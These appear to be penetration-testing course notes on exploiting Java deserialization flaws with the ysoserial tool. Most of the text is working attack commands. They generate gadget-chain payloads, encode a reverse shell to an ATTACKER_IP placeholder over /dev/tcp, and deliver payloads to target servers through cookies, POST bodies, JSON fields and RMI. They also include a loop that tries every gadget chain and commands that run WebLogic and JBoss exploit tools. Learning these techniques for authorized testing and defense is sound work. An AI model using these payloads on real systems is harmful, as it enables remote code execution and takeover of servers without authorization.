---
tags: [vapt, deserialization, java, advanced]
difficulty: advanced
module: "15 - Deserialization"
topic: "15.02 Java Deserialization (ysoserial)"
portswigger_labs: ["Exploiting Java deserialization with Apache Commons"]
---

# 15.02 — Java Deserialization (ysoserial)

## Java Serialized Object Identification

```
JAVA SERIALIZED OBJECTS START WITH MAGIC BYTES:
  Binary: 0xAC 0xED 0x00 0x05
  Base64: rO0ABX...

FINDING JAVA DESERIALIZATION POINTS:
  ✓ Cookies with base64 starting with rO0AB
  ✓ POST body with binary blob starting with AC ED
  ✓ HTTP header: X-Java-Serialized-Object
  ✓ Java RMI endpoints (port 1099)
  ✓ JMX endpoints (port 9999, 7199, etc.)
  ✓ Spring Security remember-me cookie
  ✓ WebLogic, JBoss, WebSphere admin interfaces

CHECK FOR MAGIC BYTES IN BURP:
  HTTP History → look for base64 blobs → decode → first bytes AC ED 00 05?
```

---

## Gadget Chains — The Concept

```
GADGET CHAIN:
  A sequence of classes where:
  Class A's readObject() calls method X on Class B
  Class B's method X calls method Y on Class C
  Class C's method Y executes OS commands!
  
  The attacker creates a crafted serialized object of Class A
  that, when deserialized, triggers this chain!
  
POPULAR GADGET LIBRARIES (vulnerable Java code):
  Apache Commons Collections (CC1-CC7)
  Apache Commons BeanUtils
  Spring Framework
  Groovy
  Hibernate
  Apache Wicket
  JDK (internal gadgets!)
  
  If ANY of these are on the classpath → deserialization RCE likely!
```

---

## ysoserial Tool

```bash
# DOWNLOAD ysoserial:
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# LIST AVAILABLE GADGET CHAINS:
java -jar ysoserial-all.jar 2>&1 | head -30

# KEY GADGETS:
# CommonsCollections1   → Apache Commons Collections 3.x
# CommonsCollections6   → Apache Commons Collections 3.x (different JDK version)
# CommonsCollections4   → Apache Commons Collections 4.x
# Spring1               → Spring Framework
# Groovy1               → Groovy
# JRMPClient            → Java RMI client
# URLDNS                → DNS lookup only (no RCE — for detection!)
# Jdk7u21               → JDK 7 Update 21 gadget

# GENERATE PAYLOAD (CommonsCollections6 → execute 'id'):
java -jar ysoserial-all.jar CommonsCollections6 'id' > payload.ser

# GENERATE PAYLOAD (base64 encoded):
java -jar ysoserial-all.jar CommonsCollections6 'id' | base64 | tr -d '\n'

# FOR REVERSE SHELL:
java -jar ysoserial-all.jar CommonsCollections6 \
  'bash -c {echo,BASE64_ENCODED_CMD}|{base64,-d}|bash' > payload.ser

# ENCODE THE REVERSE SHELL:
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC9...
# Use: {echo,YmFzaCAtaSA...}|{base64,-d}|bash
```

---

## Blind Detection with URLDNS Gadget

```bash
# URLDNS DOES DNS LOOKUP ONLY (NO CODE EXECUTION):
# Use for SAFE detection without RCE side effects!

java -jar ysoserial-all.jar URLDNS 'http://YOUR_BURP_COLLABORATOR.burpcollaborator.net' \
  | base64 | tr -d '\n' > dns_payload.txt

# SEND AS COOKIE / POST BODY:
curl -X POST "https://target.com/api/parse" \
  -H "Cookie: session=$(cat dns_payload.txt)" \
  -H "Content-Type: application/x-java-serialized-object"

# OR IN REQUEST BODY:
java -jar ysoserial-all.jar URLDNS 'http://YOUR_COLLABORATOR' > dns_payload.bin
curl -X POST "https://target.com/api/data" \
  -H "Content-Type: application/octet-stream" \
  --data-binary @dns_payload.bin

# IF BURP COLLABORATOR RECEIVES DNS QUERY:
# → Java deserialization happening on the server!
# → Now try RCE gadgets!
```

---

## Sending Payloads

```bash
# METHOD 1: COOKIE:
PAYLOAD=$(java -jar ysoserial-all.jar CommonsCollections6 'id' | base64 | tr -d '\n')
curl -v "https://target.com/profile" \
  -H "Cookie: session=$PAYLOAD"

# METHOD 2: POST BODY (binary):
java -jar ysoserial-all.jar CommonsCollections6 'id' > /tmp/payload.bin
curl -v "https://target.com/api/invoke" \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @/tmp/payload.bin

# METHOD 3: BASE64 IN JSON FIELD:
PAYLOAD=$(java -jar ysoserial-all.jar CommonsCollections6 'id' | base64 | tr -d '\n')
curl -v "https://target.com/api/process" \
  -H "Content-Type: application/json" \
  -d "{\"data\": \"$PAYLOAD\"}"

# METHOD 4: XML FIELD (wrapped in CDATA):
# <data><![CDATA[rO0ABX...BASE64...]]></data>

# METHOD 5: JAVA RMI:
java -jar ysoserial-all.jar JRMPClient 'ATTACKER_IP:YSOSERIAL_PORT' > /tmp/payload.bin
# (requires ysoserial JRMP listener setup)
```

---

## Testing Multiple Gadget Chains

```bash
# SCRIPT TO TRY ALL GADGET CHAINS:
ENDPOINT="https://target.com/api/data"
COOKIE_NAME="session"
COMMAND="id"

for gadget in CommonsCollections1 CommonsCollections2 CommonsCollections3 \
              CommonsCollections4 CommonsCollections5 CommonsCollections6 \
              CommonsCollections7 Spring1 Spring2 Groovy1 BeanShell1; do
  echo "Testing gadget: $gadget"
  
  PAYLOAD=$(java -jar ysoserial-all.jar $gadget "$COMMAND" 2>/dev/null | \
    base64 | tr -d '\n')
  
  if [ -n "$PAYLOAD" ]; then
    RESPONSE=$(curl -s "$ENDPOINT" \
      -H "Cookie: $COOKIE_NAME=$PAYLOAD" \
      --max-time 10)
    echo "$gadget → Response length: ${#RESPONSE}"
  fi
done
```

---

## Detecting Which Library Is Present

```bash
# FINGERPRINT THE TARGET JAVA APP:

# 1. CHECK ERROR MESSAGES:
# "org.apache.commons.collections" in stack trace → CommonsCollections!
# "com.sun.org.apache.xalan" → JDK gadget
# "org.springframework" → Spring gadgets

# 2. CHECK /actuator ENDPOINTS (Spring Boot):
curl https://target.com/actuator/env | python3 -m json.tool | grep -i "commons\|spring\|groovy"

# 3. CHECK JAR MANIFEST (if file read via another vuln):
# cat /WEB-INF/lib/commons-collections-3.2.2.jar → confirms library!

# 4. CHECK ERROR MESSAGES:
# Submit invalid base64 as cookie → error may reveal class path/library names

# 5. JAVA VERSION:
# Java 8u20- → more gadget options
# Java 8u20+ → some gadgets blocked but JRMPClient may still work
```

---

## JBoss / WebLogic / WebSphere Specific

```bash
# THESE ENTERPRISE JAVA SERVERS ARE COMMONLY VULNERABLE:

# WEBLOGIC (port 7001):
# CVE-2019-2725, CVE-2020-14882, CVE-2020-14750
python3 weblogic-exploit.py --ip TARGET --port 7001 --payload 'cmd'

# JBOSS:
# Older JBoss versions vulnerable via HTTP invoker
curl -X POST "http://target.com:8080/invoker/readonly" \
  --data-binary @ysoserial_payload.bin

# WEBSPHERE:
# Admin console may accept serialized objects

# AUTOMATED TOOL: jexboss:
git clone https://github.com/joaomatosf/jexboss
python3 jexboss.py -u http://target.com:8080/
```

---

## Related Notes
- [[01 - What is Serialization and Deserialization]] — fundamentals
- [[11 - Magic Methods Abuse]] — readObject() internals
- [[12 - Defense Avoid Untrusted Deserialization]] — defense
